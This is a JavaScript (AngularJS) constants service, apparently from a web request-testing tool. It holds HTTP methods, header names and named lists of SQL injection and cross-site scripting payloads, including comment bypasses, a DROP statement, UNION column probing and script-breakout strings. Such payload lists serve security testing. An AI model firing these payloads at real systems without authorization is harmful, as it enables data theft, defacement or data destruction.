/*
 * This will eventually be moved into a database
 */
app.service('appConstants', function() {
    const defaultMethod = "GET";
    const methods = ["GET", "POST", "PUT", "PATCH", "DELETE"];
    const sqlInjection = [
        {
            "name": "Line Comments",
            "value": `SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'`
        },
        {
            "name": "Inline Comments 1",
            "value": `DROP/*comment*/sampletable`
        },
        {
            "name": "Inline Comments 2",
            "value": `SELECT /*!32302 1/0, */ 1 FROM tablename`
        },
        {
            "name": "MySQL Version Detection",
            "value": `SELECT /*!32302 1/0, */ 1 FROM tablename`
        },
        {
            "name": "Finding Column Names with HAVING BY",
            "value": `' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 --`
        },
        {
            "name": "Finding Column Type",
            "value": `SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--`
        },
    ];
    const xss = [
        {
            "name": "BODY tag",
            "value": `<BODY ONLOAD=alert('XSS')>`
        },
        {
            "name": "Escaping JavaScript escapes 1",
            "value": `\";alert('XSS');//`
        },
        {
            "name": "Escaping JavaScript escapes 2",
            "value": `</script><script>alert('XSS');</script>`
        },
        {
            "name": "& JavaScript includes",
            "value": `<BR SIZE="&{alert('XSS')}">`
        },
        {
            "name": "STYLE sheet",
            "value": `<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`
        },{
            "name": "STYLE tags with broken up JavaScript for XSS",
            "value": `<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>`
        }
    ];

    const custom = [
        {
            "name": "Mike's Special 1",
            "value": `-->!<script src="alert('code')"<!--`
        },
        {
            "name": "Mike's Special 2",
            "value": `;1=1; and select * from users where 1=1`
        },
        {
            "name": "Mike's Special 3",
            "value": `<script><!<>>>><<<!!!.js console.log()`
        },
        {
            "name": "Mike's Special 4",
            "value": `><div><script>alert();alert();</script></div>`
        }
    ];

    const headerFields = [
        "Accept",
        "Accept-Charset",
        "Accept-Encoding",
        "Accept-Language",
        "Accept-Datetime",
        "Authorization",
        "Cache-Control",
        "Connection",
        "Cookie",
        "Content-Length",
        "Content-MD5",
        "Content-Type",
        "Date",
        "Expect",
        "Forwarded",
        "From",
        "Host",
        "If-Match",
        "If-Modified-Since",
        "If-None-Match",
        "If-Range",
        "If-Unmodified-Since",
        "Max-Forwards",
        "Origin",
        "Pragma",
        "Proxy-Authorization",
        "Range",
        "Referer",
        "TE",
        "User-Agent",
        "Upgrade",
        "Via",
        "Warning",
        "X-Requested-With",
        "DNT",
        "X-Forwarded-For",
        "X-Forwarded-Host",
        "X-Forwarded-Proto",
        "Front-End-Https",
        "X-Http-Method-Override",
        "X-ATT-DeviceId",
        "X-Wap-Profile",
        "Proxy-Connection",
        "X-UIDH",
        "X-Csrf-Token",
        "X-Request-ID",
        "X-Correlation-ID"
    ];

    this.getMethods = function() {
        return methods;
    };

    this.getHeaders = function() {
        return headerFields;
    };

    this.getDefaultMethod = function() {
        return defaultMethod;
    };

    this.getSqlInjection = function() {
        return sqlInjection;
    };

    this.getXss = function() {
        return xss;
    };

    this.getCustom = function() {
        return custom;
    };

    this.getAllAttacks = function(){
        return sqlInjection.concat(xss).concat(custom);
    };
});